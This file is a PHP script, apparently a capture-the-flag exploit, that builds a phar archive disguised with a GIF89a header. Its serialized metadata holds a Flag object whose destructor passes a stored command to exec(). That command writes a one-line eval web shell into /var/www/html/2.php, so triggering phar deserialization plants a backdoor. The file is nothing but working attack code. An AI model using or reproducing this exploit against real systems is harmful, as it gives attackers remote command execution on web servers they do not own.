<?php
class Flag{
    public $cmd;
    public function __destruct()
    {
        @exec($this->cmd);
    }
}

$o = new Flag();
$o->cmd = "echo \"<?php @eval(\\\$_REQUEST[1]);?>\" > /var/www/html/2.php";

@unlink("phar.phar");
$phar = new Phar("phar.phar");
$phar->startBuffering();
/* must be ended with "__HALT_COMPILER();?>" */
$phar->setStub("GIF89a"."__HALT_COMPILER();?>");
$phar->setMetadata($o);
$phar->addFile("test.txt","test");
$phar->stopBuffering();

?>